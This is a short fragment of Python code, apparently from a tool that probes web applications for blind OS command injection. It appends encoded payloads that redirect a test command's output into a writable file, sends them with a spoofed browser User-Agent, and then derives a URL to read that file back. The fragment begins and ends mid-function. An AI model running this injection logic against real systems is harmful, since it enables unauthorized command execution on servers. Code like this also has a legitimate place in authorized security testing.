        for write_op in FILE_WRITE_OPS:
            payload = sep + ' ' + test_cmd + write_op + writable_path
            encoded = urllib.parse.quote(payload, safe='')
            inject_url = url + '?' + urllib.parse.urlencode({param: 'x'}) + encoded
            req = urllib.request.Request(inject_url)
            req.add_header('User-Agent', 'Mozilla/5.0')
            try:
                urllib.request.urlopen(req, timeout=10)
            except Exception:
                pass
            time.sleep(0.5)
            if readable_url:
                fetch_url = readable_url
            else:
                base = urllib.parse.urlparse(url)
                fetch_url = base.scheme + '://' + base.netloc + '/' + writable_path.split('/')[-1]
